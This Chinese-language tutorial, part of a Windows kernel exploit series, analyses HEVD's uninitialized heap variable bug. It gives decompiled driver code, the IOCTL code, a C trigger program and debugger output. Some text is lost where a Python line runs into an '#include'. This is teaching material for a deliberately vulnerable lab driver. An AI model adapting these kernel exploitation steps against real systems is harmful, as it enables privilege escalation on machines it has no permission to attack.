# 0x00：前言
这是 Windows kernel exploit 系列的最后一篇，如果你按顺序观看我之前文章并且自己调过的话，应该对各种漏洞类型在Windows 7
下的利用比较熟悉了，其他的话我放在最后说把，现在进入我所谓的最后一个专题，未初始化的堆变量利用，看此文章之前你需要有以下准备：
  * Windows 7 x86 sp1虚拟机
  * 配置好windbg等调试工具，建议配合VirtualKD使用
  * HEVD+OSR Loader配合构造漏洞环境
传送门：
[+] [Windows Kernel Exploit(一) -> UAF](https://xz.aliyun.com/t/5493)
[+] [Windows Kernel Exploit(二) -> StackOverflow](https://xz.aliyun.com/t/5536)
[+] [Windows Kernel Exploit(三) -> Write-What-Where](https://xz.aliyun.com/t/5615)
[+] [Windows Kernel Exploit(四) -> PoolOverflow](https://xz.aliyun.com/t/5709)
[+] [Windows Kernel Exploit(五) -> Null-Pointer-Dereference](https://xz.aliyun.com/t/5721)
[+] [Windows Kernel Exploit(六) -> Uninitialized-Stack-Variable](https://xz.aliyun.com/t/5759)
# 0x01：漏洞原理
## 未初始化堆变量
我们还是先用IDA分析`HEVD.sys`，找到相应的函数`TriggerUninitializedHeapVariable`，这里首先还是初始化了异常处理机制，验证我们传入的`UserBuffer`是否在
user mode ，然后申请了一块分页池，将我们的`UserBuffer`给了`UserValue`，判断是否等于 0xBAD0B0B0
，如果相等则给回调函数之类的赋值，如果不相等则直接调用回调函数，根据前一篇的经验，这里肯定是修改回调函数为我们shellcode的位置，最后调用提权
    int __stdcall TriggerUninitializedHeapVariable(void *UserBuffer)
    {
      int result; // eax
      int UserValue; // esi
      _UNINITIALIZED_HEAP_VARIABLE *UninitializedHeapVariable; // [esp+18h] [ebp-1Ch]
      CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h]
      ms_exc.registration.TryLevel = 0;
      ProbeForRead(UserBuffer, 0xF0u, 4u);
      UninitializedHeapVariable = (_UNINITIALIZED_HEAP_VARIABLE *)ExAllocatePoolWithTag(PagedPool, 0xF0u, 0x6B636148u);
      if ( UninitializedHeapVariable )
      {
        DbgPrint("[+] Pool Tag: %s\n", "'kcaH'");
        DbgPrint("[+] Pool Type: %s\n", "PagedPool");
        DbgPrint("[+] Pool Size: 0x%X\n", 0xF0);
        DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedHeapVariable);
        UserValue = *(_DWORD *)UserBuffer;
        DbgPrint("[+] UserValue: 0x%p\n", *(_DWORD *)UserBuffer);
        DbgPrint("[+] UninitializedHeapVariable Address: 0x%p\n", &UninitializedHeapVariable);
        if ( UserValue == 0xBAD0B0B0 )
        {
          UninitializedHeapVariable->Value = 0xBAD0B0B0;
          UninitializedHeapVariable->Callback = (void (__stdcall *)())UninitializedHeapVariableObjectCallback;
          memset(UninitializedHeapVariable->Buffer, 0x41, 0xE8u);
          UninitializedHeapVariable->Buffer[0x39] = 0;
        }
        DbgPrint("[+] Triggering Uninitialized Heap Variable Vulnerability\n");
        if ( UninitializedHeapVariable )
        {
          DbgPrint("[+] UninitializedHeapVariable->Value: 0x%p\n", UninitializedHeapVariable->Value);
          DbgPrint("[+] UninitializedHeapVariable->Callback: 0x%p\n", UninitializedHeapVariable->Callback);
          UninitializedHeapVariable->Callback();
        }
        result = 0;
      }
      else
      {
        DbgPrint("[-] Unable to allocate Pool chunk\n");
        ms_exc.registration.TryLevel = 0xFFFFFFFE;
        result = 0xC0000017;
      }
      return result;
    }
我们查看一下源码文件是如何说明的，安全的方案先检查了是否存在空指针，然后将`UninitializedMemory`置为NULL，最后安全的调用了回调函数，而不安全的方案则在不确定
Value 和 Callback 的情况下直接调用了回调函数
    #ifdef SECURE
            else {
                DbgPrint("[+] Freeing UninitializedMemory Object\n");
                DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
                DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedMemory);
                //
                // Free the allocated Pool chunk
                //
                ExFreePoolWithTag((PVOID)UninitializedMemory, (ULONG)POOL_TAG);
                //
                // Secure Note: This is secure because the developer is setting 'UninitializedMemory'
                // to NULL and checks for NULL pointer before calling the callback
                //
                //
                // Set to NULL to avoid dangling pointer
                //
                UninitializedMemory = NULL;
            }
    #else
            //
            // Vulnerability Note: This is a vanilla Uninitialized Heap Variable vulnerability
            // because the developer is not setting 'Value' & 'Callback' to definite known value
            // before calling the 'Callback'
            //
            DbgPrint("[+] Triggering Uninitialized Memory in PagedPool\n");
    #endif
            //
            // Call the callback function
            //
            if (UninitializedMemory)
            {
                DbgPrint("[+] UninitializedMemory->Value: 0x%p\n", UninitializedMemory->Value);
                DbgPrint("[+] UninitializedMemory->Callback: 0x%p\n", UninitializedMemory->Callback);
                UninitializedMemory->Callback();
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            Status = GetExceptionCode();
            DbgPrint("[-] Exception Code: 0x%X\n", Status);
        }
漏洞的原理我们很清楚了，现在就是如何构造和利用的问题了，如果你没有看过我之前的文章，建议看完这里之后去看看池溢出那一篇，最好是读一下文章中所提到的Tarjei
Mandt 写的 Kernel Pool Exploitation on Windows 7，对Windows 7 内核池有一个比较好的认识
# 0x02：漏洞利用
## 控制码
我们还是从控制码入手，在`HackSysExtremeVulnerableDriver.h`中定位到相应的定义
    #define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL               IOCTL(0x80C)
然后我们用python计算一下控制码
    >>> hex((0x00000022 
    #include
    HANDLE hDevice = NULL;
    BOOL init()
    {
        // Get HANDLE
        hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        printf("[+]Start to get HANDLE...\n");
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            return FALSE;
        }
        printf("[+]Success to get HANDLE!\n");
        return TRUE;
    }
    VOID Trigger_shellcode()
    {
        DWORD bReturn = 0;
        char buf[4] = { 0 };
        *(PDWORD32)(buf) = 0xBAD0B0B0;
        DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &bReturn, NULL);
    }
    int main()
    {
        if (init() == FALSE)
        {
            printf("[+]Failed to get HANDLE!!!\n");
            system("pause");
            return 0;
        }
        Trigger_shellcode();
        //__debugbreak();
        system("pause");
        return 0;
    }
这里我们打印的信息如下，如我们所愿，并没有异常发生
    3: kd> g
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******
    [+] Pool Tag: 'kcaH'
    [+] Pool Type: PagedPool
    [+] Pool Size: 0xF0
    [+] Pool Chunk: 0x9A7FFF10